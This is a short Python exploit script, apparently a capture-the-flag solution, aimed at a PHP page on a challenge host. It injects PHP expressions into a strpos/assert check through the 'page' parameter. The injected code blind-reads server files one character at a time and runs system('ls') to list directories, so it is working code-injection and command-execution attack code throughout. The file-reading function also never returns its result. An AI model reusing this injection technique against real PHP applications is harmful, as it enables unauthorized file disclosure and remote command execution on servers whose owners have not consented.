import requests
import string
import base64

url = "http://prob.nagi.moe:9091/index.php"

# strpos('./includes/[php://].php', 'php://') === false
base = "', '1') === false && %s && strpos('1"

def check(payload):
    r = requests.get(url, params={'page':payload})
    return "No php wrapper" not in r.text

def get_len(path, n=0):
    for i in range(2048):
        if i < n:
            continue

        print "Length upto %d" % i
        s = 'strlen(file_get_contents(strrev("%s"))) == %d' % (path, i)
        if check(base % s):
            print "Found Length %d" % i
            return i

def read_file_contents_2(path, n=0, start_at=0):
    if n!= 0 :
        length = n
    else:
        length = get_len(path, n)
    s = ""
    while len(s) < length:
        print len(s), s
        try:
            for c in string.printable:
                tmp = s + c
                payload = 'substr(file_get_contents(strrev("%s")), 0, %d) == base64_decode("%s")' % (
                path, len(tmp), base64.b64encode(tmp))

                if check(base % payload):
                    s += c
        except Exception as e:
            continue

def get_dir_info(path, n):
    length = get_dir_length(path, n)
    s = ""
    while len(s) < length:
        print s
        for c in string.printable:
            tmp = s + c
            payload = 'substr(system("ls -a1 %s | paste -sd \',\'"), 0, %d) == base64_decode("%s")' % (
            path, len(tmp), base64.b64encode(tmp))

            if check(base % payload):
                s += c

def get_dir_length(path, n=0):
    for i in range(2048):
        if i < n:
            continue
        print "Len : %d" % i
        s = 'strlen(system("ls -al %s | paste -sd \',\'")) == %d' % (path, i)
        if check(base % s):
            print "Found length %d" % i
            return i

print read_file_contents_2("./index.php"[::-1], 1524, 0)